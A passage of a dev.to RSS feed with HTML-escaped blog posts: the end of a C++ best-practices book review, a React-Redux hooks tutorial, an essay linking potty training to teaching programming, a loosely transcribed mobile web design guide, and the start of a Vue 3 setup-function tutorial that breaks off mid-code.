&lt;pre class="highlight cpp"&gt;&lt;code&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;Class&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;member&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;nullptr&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="c1"&gt;// removed by the compiler, it would be UB&lt;/span&gt;
    &lt;span class="c1"&gt;// if this were ever null&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;42&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;It's impossible for the check to ever fail, compilers nowadays remove this check, yet this is technically UB. I don't see any reason to write such code, but I look around in the codebases I have access to and... I don't want to continue that phrase... If you find any, just remove that code.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;If you're afraid of too lengthy books, but you also don't want something shallow, if you are ready to delve yourself into further research and experimentation, &lt;a href="https://leanpub.com/cppbestpractices"&gt;this is your book&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Jason Turner is probably among the most known C++ developers nowadays with &lt;a href="https://www.youtube.com/watch?v=zBkNBP00wJE"&gt;iconic talks&lt;/a&gt; and a &lt;a href="https://www.youtube.com/channel/UCxHAlbZQNFU2LgEtiqd2Maw"&gt;popular YouTube channel&lt;/a&gt; and this book is the distilled version of what he learned about C++ development during the last 15 years. Most of us have definitely a lot to learn from his experience, but it doesn't come for free.&lt;/p&gt;

&lt;p&gt;I don't mean &lt;a href="https://leanpub.com/cppbestpractices"&gt;the $10 that is the initial price&lt;/a&gt;, but the work you have to put in. Take it the other way, he doesn't sell you dogmas and believes, he shares his best practices and asks you to do your research and decisions. It's the best way to grow.&lt;/p&gt;

</description>
      <category>books</category>
      <category>watercooler</category>
      <category>cpp</category>
      <category>bestpractices</category>
    </item>
    <item>
      <title>Introduction React-Redux using Hooks (useSelector &amp;&amp; useDispatch)</title>
      <author>Muhammad Bilal Bangash</author>
      <pubDate>Sat, 05 Jun 2021 17:59:21 +0000</pubDate>
      <link>https://dev.to/bangash1996/introduction-react-redux-using-hooks-useselector-usedispatch-26ch</link>
      <guid>https://dev.to/bangash1996/introduction-react-redux-using-hooks-useselector-usedispatch-26ch</guid>
      <description>&lt;h2&gt;
  &lt;a href="#introduction"&gt;
  &lt;/a&gt;
  Introduction:
&lt;/h2&gt;

&lt;p&gt;Before reading this article you should know about React &amp;amp; Redux, its working.&lt;/p&gt;

&lt;p&gt;This article is about React-Redux Hooks. We will go through below main points in this article:&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#-hooks-for-redux"&gt;
  &lt;/a&gt;
  * Hooks for Redux.
&lt;/h4&gt;

&lt;h4&gt;
  &lt;a href="#-how-to-use-raw-usedispatch-endraw-hook"&gt;
  &lt;/a&gt;
  * How to use &lt;code&gt;useDispatch&lt;/code&gt; Hook.
&lt;/h4&gt;

&lt;h4&gt;
  &lt;a href="#-how-to-use-raw-useselector-endraw-hook"&gt;
  &lt;/a&gt;
  * How to use &lt;code&gt;useSelector&lt;/code&gt; Hook.
&lt;/h4&gt;

&lt;h3&gt;
  &lt;a href="#1-hooks-for-redux"&gt;
  &lt;/a&gt;
  1. Hooks for Redux
&lt;/h3&gt;

&lt;p&gt;Before Hooks, we always used a &lt;code&gt;connect()&lt;/code&gt; which is a higher-order component and wrapper to our component, &lt;code&gt;connect()&lt;/code&gt; read values from the Redux store.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;connect()&lt;/code&gt; takes two arguments, both optional:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;code&gt;mapStateToProps&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;mapDispatchToProps&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;mapStateToProps:&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;called every time the store state changes. It receives the entire store state and should return an object of data this component needs.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;mapDispatchToProps:&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This parameter can either be a function, or an object. If it‚Äôs a function, it will be called once on component creation. It will receive dispatch as an argument and should return an object full of functions that use dispatch to dispatch actions.&lt;/p&gt;

&lt;p&gt;more about &lt;a href="https://react-redux.js.org/api/connect"&gt;connect()&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Let's move towards react-redux hooks. React-Redux now offers a set of hook APIs as an alternative to existing &lt;code&gt;connect()&lt;/code&gt; Higher-Order Component. These APIs allow you to subscribe to the Redux store and dispatch actions, without having to wrap your components in &lt;code&gt;connect()&lt;/code&gt;. By using the Hook API with Function components, components are kept small and the code remains clean.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#hooks"&gt;
  &lt;/a&gt;
  Hooks:
&lt;/h4&gt;

&lt;h3&gt;
  &lt;a href="#2-usedispatch"&gt;
  &lt;/a&gt;
  2. useDispatch():
&lt;/h3&gt;

&lt;p&gt;&lt;code&gt;useDispatch()&lt;/code&gt; hook is equivalent of &lt;code&gt;mapDispatchToProps&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;We will invoke &lt;code&gt;useDispatch&lt;/code&gt; and store it to a variable, &lt;code&gt;dispatch&lt;/code&gt;. This hook returns a &lt;code&gt;reference&lt;/code&gt; to the &lt;code&gt;dispatch function&lt;/code&gt; from the Redux store. You may use it to dispatch actions as needed.&lt;br&gt;
And we dispatch it by calling dispatch passing in the return value from the action creator.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;How to use&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Below is the small component where using &lt;code&gt;useDispatch&lt;/code&gt; and &lt;code&gt;useSelector&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;import React from "react";
//import useDispatch from react-redux
import { useDispatch} from "react-redux";
//these are actions define in redux&amp;gt;actions folder
import { updateFirstName } from "../redux/actions"; 

const Form = () =&amp;gt; {

  const dispatch = useDispatch();

  const handleFirstName = () =&amp;gt; {
    //dispatching the action
    dispatch(updateFirstName("Jason"));
  };

  return (
    &amp;lt;React.Fragment&amp;gt;
      &amp;lt;div className="container"&amp;gt;
        &amp;lt;button onClick={handleFirstName}&amp;gt;Update First 
        Name&amp;lt;/button&amp;gt;
      &amp;lt;/div&amp;gt;
    &amp;lt;/React.Fragment&amp;gt;
  );
};

export default Form;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;complete code in &lt;a href="https://github.com/Bilal-Bangash/redux-hooks"&gt;GITHUB redux-hooks&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#3useselector"&gt;
  &lt;/a&gt;
  3.useSelector():
&lt;/h3&gt;

&lt;p&gt;&lt;code&gt;useSelector()&lt;/code&gt; hook is equivalent of &lt;code&gt;mapStateToProps&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;useSelector&lt;/code&gt; is a function that takes the current state as an argument and returns whatever data you want from it and it allows you to store the return values inside a variable within the scope of you functional components instead of passing down as props&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;import React from "react";
import { useDispatch, useSelector } from "react-redux";
import { updateFirstName } from "../redux/actions";

const Form = () =&amp;gt; {
  const dispatch = useDispatch();
  const nameObj = useSelector((state) =&amp;gt; state.nameReducer);
  const { firstName } = nameObj;
  const handleFirstName = () =&amp;gt; {
    dispatch(updateFirstName("Jason"));
  };

  return (
    &amp;lt;React.Fragment&amp;gt;
      &amp;lt;div className="container"&amp;gt;
        &amp;lt;label&amp;gt;First Name : {firstName}&amp;lt;/label&amp;gt;
        &amp;lt;button onClick={handleFirstName}&amp;gt;Update First Name&amp;lt;/button&amp;gt;

        &amp;lt;label&amp;gt;Last Name : {lastName}&amp;lt;/label&amp;gt;
        &amp;lt;button type="submit" onClick={handleLastName}&amp;gt;
          Update First Name
        &amp;lt;/button&amp;gt;
      &amp;lt;/div&amp;gt;
    &amp;lt;/React.Fragment&amp;gt;
  );
};

export default Form;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;complete code in &lt;a href="https://github.com/Bilal-Bangash/redux-hooks"&gt;GITHUB redux-hooks&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;h5&gt;
  &lt;a href="#usestore"&gt;
  &lt;/a&gt;
  useStore():
&lt;/h5&gt;

&lt;p&gt;&lt;code&gt;useStore()&lt;/code&gt; hook returns a reference to the same Redux store that was passed into &lt;code&gt;Provider&lt;/code&gt; component.&lt;/p&gt;

&lt;p&gt;This hook should probably not be used frequently. Prefer useSelector() as your primary choice. However, this may be useful for less common scenarios that do require access to the store, such as replacing reducers.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;import React from 'react'
import { useStore } from 'react-redux'

export const ExampleComponent = ({ value }) =&amp;gt; {
  const store = useStore()

  // EXAMPLE ONLY! Do not do this in a real app.
  // The component will not automatically update if the store state changes
  return &amp;lt;div&amp;gt;{store.getState().obj.name}&amp;lt;/div&amp;gt;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;complete code in &lt;a href="https://github.com/Bilal-Bangash/redux-hooks"&gt;GITHUB redux-hooks&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;If you wanna learn more about &lt;code&gt;useDispatch&lt;/code&gt; and &lt;code&gt;useSelector&lt;/code&gt; here it's official link &lt;a href="//react-redux.js.org/api/hooks"&gt;React Redux Hooks&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Further improvement, suggestion or help. Welcome :) &lt;/p&gt;

</description>
      <category>react</category>
      <category>redux</category>
      <category>javascript</category>
    </item>
    <item>
      <title>How Potty Training Shaped My Tech Teaching Style</title>
      <author>Shaundai Person</author>
      <pubDate>Sat, 05 Jun 2021 17:56:07 +0000</pubDate>
      <link>https://dev.to/shaundai/how-potty-training-shaped-my-tech-teaching-style-29e2</link>
      <guid>https://dev.to/shaundai/how-potty-training-shaped-my-tech-teaching-style-29e2</guid>
      <description>&lt;p&gt;&lt;em&gt; This post was inspired by my interview on &lt;a href="https://www.hanselminutes.com/"&gt;Hanselminutes podcast&lt;/a&gt;, to be released June 10 2021)&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;For the first few days, my son and I were both pretty frustrated with the idea of potty training.  After Lysoling and mopping the floor for the billionth time, I remember trying to explain to him once again that he needed to stay seated until he ‚Äúwent.‚Äù  He wanted to go play.  He stood up again.  I could tell from the tired look in his round eyes he just wanted things to go back to the way they were before.  I did too.&lt;/p&gt;

&lt;p&gt;‚ÄúForget it,‚Äù I sighed.  I exhaustedly put down the empty paper towel roll in my hand, turned up the sound on the TV, and quietly walked into my closet and shut the door behind me - jaw clenched the whole way.  Confident that my baby wouldn‚Äôt hear me, I screamed at the top of my lungs until I ran out of breath.&lt;/p&gt;




&lt;p&gt;I used a potty training method from a book that promised to have him trained in 3 days. It came highly recommended from parents I trusted.  They swore the method worked like magic.  Instead, I was emotionally drained and ready to quit on day 2.&lt;/p&gt;

&lt;p&gt;Feeling defeated, I called my mom for advice.  ‚ÄúI‚Äôm following these instructions &lt;em&gt;exactly&lt;/em&gt; and there‚Äôs &lt;em&gt;absolutely&lt;/em&gt; no way he‚Äôll be potty trained by tomorrow.  Maybe it‚Äôs just too early to be trying this.  We‚Äôll try again in 6 months.‚Äù&lt;/p&gt;

&lt;p&gt;I could almost hear her shaking her head through the phone.  ‚ÄúNo. He‚Äôs ready now,‚Äù she said.  ‚ÄúRemember, all of this is completely new for him.  Think about what you‚Äôre doing.  You‚Äôre giving him a tool he‚Äôs &lt;em&gt;&lt;strong&gt;never seen before&lt;/strong&gt;&lt;/em&gt;, language he‚Äôs &lt;em&gt;&lt;strong&gt;never heard before&lt;/strong&gt;&lt;/em&gt;, and expecting him to just put it together to ‚Äòinstinctively‚Äô do something he‚Äôs &lt;em&gt;&lt;strong&gt;never done before&lt;/strong&gt;&lt;/em&gt;.  &lt;em&gt;You&lt;/em&gt; need to rethink the way you‚Äôre trying to teach him.‚Äù &lt;/p&gt;

&lt;p&gt;As usual, my mother was right.  With small changes to my teaching style, my kiddo was potty trained in a day.&lt;/p&gt;

&lt;p&gt;When it came to teaching programming, I wanted to avoid the mistakes I‚Äôd made when I first started to potty train my toddler.  Often, I hear stories from students whose learning starts out the same way.  They‚Äôre given:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;tools they‚Äôve &lt;strong&gt;never seen before&lt;/strong&gt; (ex. VS Code, new libraries)&lt;/li&gt;
&lt;li&gt;language they‚Äôve &lt;strong&gt;never used before&lt;/strong&gt; (new technical terminology),&lt;/li&gt;
&lt;li&gt;...and an unfair expectation to ‚Äòinstinctively‚Äô put these together to do something they‚Äôve &lt;strong&gt;never done before&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In the end, both the teacher and student end up frustrated or just giving up because the concepts just aren‚Äôt clicking for the student.  Though the teacher means well, there‚Äôs a huge piece missing here - the part where the teacher closes the gap in understanding by providing &lt;b&gt;context&lt;/b&gt;.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#giving-context"&gt;
  &lt;/a&gt;
  Giving Context
&lt;/h2&gt;

&lt;p&gt;Initially as a potty training teacher &lt;em&gt;(potty trainer?? Potty coach?? Potty sherpa.)&lt;/em&gt;, I let the &lt;a href="https://en.wikipedia.org/wiki/Curse_of_knowledge"&gt;curse of knowledge&lt;/a&gt;] get in the way of my ability to be effective.  I‚Äôd forgotten what it was like to be an absolute beginner at this.  After empathy, context is the most important resource I could provide to my little student.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Context is the language before and after a statement that helps you to understand its meaning.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;When it comes to teaching, providing context involves relating the new concept to something they‚Äôre familiar with.  Making the connection between difficult and already-familiar topics helps the student to&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Understand concepts quickly &lt;em&gt;and&lt;/em&gt; thoroughly&lt;/li&gt;
&lt;li&gt;Retain information for longer periods of time&lt;/li&gt;
&lt;li&gt;Apply learning effectively and accurately (because they have a deep understand)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;For me, this translates to using a lot of analogies and storytelling.  Here‚Äôs an example of using analogies to &lt;a href="https://dev.to/shaundai/state-and-setstate-explained-with-emotion-110k"&gt;explain React state and setState&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Analogies don‚Äôt have to be an elaborate 1-to-1 metaphor.  Stories can be silly.  In fact, I‚Äôd argue that if silliness is what captures your students‚Äô attention and makes a difficult topic more approachable, silly content is &lt;strong&gt;that&lt;/strong&gt; much better.  Just because it‚Äôs technical doesn‚Äôt mean it needs to be complicated!&lt;/p&gt;

&lt;p&gt;When building educational content for a large demographic, providing context also involves setting upfront expectations with people who consume your content to make sure that you are meeting them at their current level of understanding (well, getting them to meet you at the right starting point).&lt;/p&gt;

&lt;p&gt;Here are some examples of how to set expectations:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;‚ÄúThis course requires a fundamental knowledge of JavaScript‚Äù&lt;/li&gt;
&lt;li&gt;‚ÄúThis is a course about CSS for JavaScript developers‚Äù&lt;/li&gt;
&lt;li&gt;‚ÄúThis post assumes the reader has a working knowledge of AWS‚Äù&lt;/li&gt;
&lt;li&gt;‚ÄúIf you don‚Äôt yet know what recursion is, here‚Äôs a link to a blog post that explains more.  Read this first!‚Äù&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#saving-the-jargon"&gt;
  &lt;/a&gt;
  Saving the Jargon
&lt;/h2&gt;

&lt;p&gt;Potty training also helped me to realize that simply ‚Äúspewing a bunch of technical jargon‚Äù is not the same thing as teaching.  Words are, after all, just symbols we use to represent thoughts and actions.  Without the actual concepts behind the words, words are meaningless.&lt;/p&gt;

&lt;p&gt;With my 2-year-old, a mistake I made was trying to use too much vocabulary (ex: ‚Äúyou need to tell me when you need to use the potty‚Äù) when he hadn‚Äôt gotten the actual concept (connecting a feeling to an action) down yet.   Once I instead focused on limiting my use of vocabulary and SHOWING him what I wanted him to do, I saw a night-and-day difference in his understanding.&lt;/p&gt;

&lt;p&gt;This doesn‚Äôt mean technical terms aren‚Äôt important.  It &lt;strong&gt;does&lt;/strong&gt; mean that the technical jargon shouldn‚Äôt be the only thing we‚Äôre teaching.  I‚Äôd argue that in most cases, technical terms shouldn‚Äôt even be the first thing we teach.  If we effectively teach the &lt;em&gt;how&lt;/em&gt;, the &lt;em&gt;what&lt;/em&gt; can come so much more easily afterward.  &lt;/p&gt;

&lt;p&gt;&lt;em&gt; But Shaundai - how can I teach technical concepts without starting with the technical terminology?&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Here's an example explaining how heat is transferred from one object to another:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Jargon Last&lt;/strong&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;Let‚Äôs say you‚Äôre cooking food on the stove in a big pot.  A metal spoon is sitting inside the pot.  When you touch the spoon, you realize that it‚Äôs hot.  The pot is warmed by the fire on the stove, but how did the spoon get hot?  This happens through &lt;b&gt;convection&lt;/b&gt;, where the solid spoon is warmed by the hotter solid pot it is touching.  This is 1 of 3 methods of &lt;b&gt;heat transfer&lt;/b&gt; between objects.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The two technical terms I wanted you to learn were ‚Äúconvection‚Äù and ‚Äúheat transfer‚Äù.  Both came later in the paragraph, &lt;strong&gt;after&lt;/strong&gt; I‚Äôd described a scenario you were familiar with.  What if I instead gave you the definitions upfront?&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Jargon First&lt;/strong&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;&lt;b&gt;Convection&lt;/b&gt; is the movement caused within a fluid by the tendency of hotter and therefore less dense material to rise, and colder, denser material to sink under the influence of gravity, which consequently results in &lt;b&gt;heat transfer&lt;/b&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Most people would check out after reading the first few words.  Instead of putting such a strong emphasis on teaching the technical terms, put an emphasis on teaching the concepts and what the code is &lt;em&gt;doing&lt;/em&gt;.  The jargon can always be injected at the end.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;I'm currently working on a course - TypeScript for JavaScript Developers&lt;/em&gt;!  &lt;b&gt;Sign up for updates &lt;a href="https://www.tsforjs.com"&gt;here&lt;/a&gt;&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;...or find me on &lt;a href="https://twitter.com/shaundai"&gt;Twitter&lt;/a&gt;&lt;/p&gt;

</description>
      <category>tutorial</category>
      <category>todayilearned</category>
      <category>techtalks</category>
      <category>devjournal</category>
    </item>
    <item>
      <title>Mobile friendly website design</title>
      <author>Rezaul karimüáßüá©</author>
      <pubDate>Sat, 05 Jun 2021 17:34:46 +0000</pubDate>
      <link>https://dev.to/rezaulkarim014/mobile-friendly-website-design-305o</link>
      <guid>https://dev.to/rezaulkarim014/mobile-friendly-website-design-305o</guid>
      <description>&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--h-5O9dOl--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1622913130945/HZb_atf4F.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--h-5O9dOl--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1622913130945/HZb_atf4F.jpeg" alt="Mobile friendly website.jpg"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#mobile-friendly-website"&gt;
  &lt;/a&gt;
  Mobile friendly website
&lt;/h2&gt;

&lt;p&gt;Are you reading this article on a monitor or in the smartphone?Do you know what is Mobile friendly website?&lt;/p&gt;

&lt;p&gt;There is over 50% probability that your answer is going to be a smartphone.since in recent years over 50% of web traffic has been generated by mobile devices.&lt;/p&gt;

&lt;p&gt;This means that half of the people who visit your website will be viewing it via mobile. And it makes up Are certain challenges for the designer such as the necessity to create device specific layouts for you will need to change the order in positioning and sometimes even the contents of your sections.&lt;/p&gt;

&lt;p&gt;So the scalar which element is appropriate for a specific device. This means that your grave has to adjust the width of the device screen.The best solution to that is reducing the number of columns. Your layout has one. Non tablet devices or place in your sections in one column when viewed on a smartphone. But is a result you might end up with some pretty lengthy pages in some cases.&lt;/p&gt;

&lt;p&gt;It is recommended that you get rid of some sections to benefit your mobile layout by using the heat map. You can determine which sections on your side in bulk the most interest and just remove the rest from the Way out. Another tip to reduce the length of your website is instead of putting elements of the same type in a list or in a grid throw them together in a council.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--XLiJvOiI--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1622912765699/0pYwGvAsn.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--XLiJvOiI--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1622912765699/0pYwGvAsn.jpeg" alt="smartphone-application-design-templates-set-flat-isolated-vector-illustration_1284-16060.jpg"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#things-should-consider"&gt;
  &lt;/a&gt;
  Things Should Consider:
&lt;/h2&gt;

&lt;p&gt;So users can view them by scrolling through the Carousel. And then move on to exploring the rest of your layout as for the navigation you want to make sure that you hide all the extra stuff you have on your header inside of the knee.&lt;/p&gt;

&lt;p&gt;Meat hamburger menu, if it‚Äôs a store of blog a news portal or side with booking functionality. Make sure you include the search icon in your header or inside the hamburger menu. So users can try and what they want straight away. If you need to place a primary city a somewhere on your page. There is no better place than the hero section.&lt;/p&gt;

&lt;p&gt;So it‚Äôs right in the users view once they open the page. I‚Äôm not able to perform this action straight away. Another option could be placing it in the hats. If you have enough room in there now tax picking the wrong font size can seriously compromised readability.&lt;/p&gt;

&lt;p&gt;So the text elements on your mobile friendly website layout should be 12 to 16 pixels for the main body copy and one or two pixels smaller for secondary elements such as captions and And tags while your age wants should be two and a half size of your base font. Headings should fit on two to three lines on average. So it doesn‚Äôt take up half of the users screen as for the clickable interactive elements such as buttons.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--5z_ah8Ef--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1622912908731/L5dvAd2ii.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--5z_ah8Ef--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1622912908731/L5dvAd2ii.jpeg" alt="social-media-marketing-mobile-phone-concept-with-people-together_23-2148439384.jpg"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#important-notes"&gt;
  &lt;/a&gt;
  Important Notes:
&lt;/h2&gt;

&lt;p&gt;And Fields make sure that their size is bigger than the average touch Target. Which is ten by ten millimetres and talking about Mine‚Äôs even better for make sure you don‚Äôt make it too long and too confusing go for a form which can fit in the screen dimensions and has it comprehensible and friendly UI whoop starts with some heavyweight functionality like online stores. For example, also require a lot of UI elements to be present on the pages. So don‚Äôt dismiss mobile users need to access all of those. Walter‚Äôs buttons and options, but do let these elements breathe and organize them in a way that is not intrusive and confusing but comfortable and intuitive to use.&lt;/p&gt;

&lt;p&gt;Well, it was pretty much it for this brief beginner‚Äôs guide to Mobile friendly website design Layout. And if your web designer, developer or side only yourself you might be interested in what some butt monster. Marketplace has to To offer in terms of risk. So excite some plus e-commerce templates and WordPress themes. And also other assets for website building such as plugins illustrations fonts and much more make sure to follow the link in the description to explore template monster Marketplace yourself.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://mrezaulkarim.com/why-should-we-use-dark-mode/"&gt;Read this article on my blog&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;For more exciting tips and tricks please read our  &lt;a href="https://mrezaulkarim.com/blog/"&gt;others articles&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Find My page on Instagram:  &lt;a href="//instagram.com/stack.content"&gt;@stack.content&lt;/a&gt;&lt;/p&gt;

</description>
      <category>mobile</category>
      <category>ux</category>
      <category>webdev</category>
      <category>design</category>
    </item>
    <item>
      <title>Setup Function In Vue 3 Composition API</title>
      <author>oyedeletemitope</author>
      <pubDate>Sat, 05 Jun 2021 17:25:57 +0000</pubDate>
      <link>https://dev.to/oyedeletemitope/setup-function-in-vue-3-composition-api-1fkf</link>
      <guid>https://dev.to/oyedeletemitope/setup-function-in-vue-3-composition-api-1fkf</guid>
      <description>&lt;p&gt;In Vue.js 2, Component objects could have data, computed, methods, and watch options. We will be using these options to write component functional logic. But when our component grows bigger, the functional logic also grows. So we end up writing the same logic in different options. Meaning that we have to write some parts in the data options, some parts in the methods, and others(computed, watch) also. So it will be difficult to understand the component core logics Since it has been written in different places.&lt;/p&gt;

&lt;p&gt;Finally, Vue.js 3 introduced a Composition API where we can solve such problems. In Composition API, we can write or composite all options logics(data, computed, methods, watch) in a single place.&lt;br&gt;
In Composition API, we call this place the setup. We can composite or write all component core logics in the setup function. In this we can organize single-core logics even for the complex components. It will be very helpful to read about Single File Components in Vue 3 before moving to setup functions in this session. Let‚Äôs take a look.&lt;/p&gt;
&lt;h4&gt;
  &lt;a href="#setup-function-in-composition-api"&gt;
  &lt;/a&gt;
  Setup function in Composition API
&lt;/h4&gt;

&lt;p&gt;Setup function is the entry point in the Composition API. It will be called before the component is created and after the props are prepared. Meaning that, before compiling and processing its template into a render object. Setup function is called before the beforeCreate hook. Note that this reference won‚Äôt be available inside the setup function. Because the component is not created yet.&lt;br&gt;
Next we are going to see how to use the setup function. The setup is the function with two arguments(props and context). Anything returned from the setup function will be available throughout our component. In Addition to that It will be accessible inside the template also. Let me explain the same with the below example:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;template&amp;gt;&lt;/span&gt;
   &lt;span class="nt"&gt;&amp;lt;div&amp;gt;&lt;/span&gt;
      &lt;span class="nt"&gt;&amp;lt;button&amp;gt;&lt;/span&gt;
      {{label}}
      &lt;span class="nt"&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
   &lt;span class="nt"&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/template&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
   &lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="na"&gt;pros&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="na"&gt;label&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
   &lt;span class="p"&gt;},&lt;/span&gt;
   &lt;span class="nx"&gt;setup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;props&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;props&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="c1"&gt;//{label:''}&lt;/span&gt;
   &lt;span class="c1"&gt;//write component core logics here&lt;/span&gt;
